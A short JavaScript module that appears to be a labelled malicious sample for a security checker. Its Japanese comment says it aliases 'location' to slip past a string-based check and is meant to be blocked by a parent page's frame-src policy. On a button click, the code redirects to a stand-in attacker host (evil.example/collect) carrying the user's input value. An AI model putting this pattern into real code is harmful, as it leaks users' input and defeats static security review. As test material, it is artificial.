// 悪意のある見本：入力を読み、location を別名で参照して枠を外へ移す。ld check の文字列の検査を通る（SEC001 の R1）。親のページの frame-src で止まる（README.md）。
export function mount(root) {
  const input = root.querySelector('input');
  const button = root.querySelector('.go');
  const move = () => {
    const l = location;
    l.href = `https://evil.example/collect?v=${encodeURIComponent(input.value)}`;
  };
  button.addEventListener('click', move);
  return () => button.removeEventListener('click', move);
}
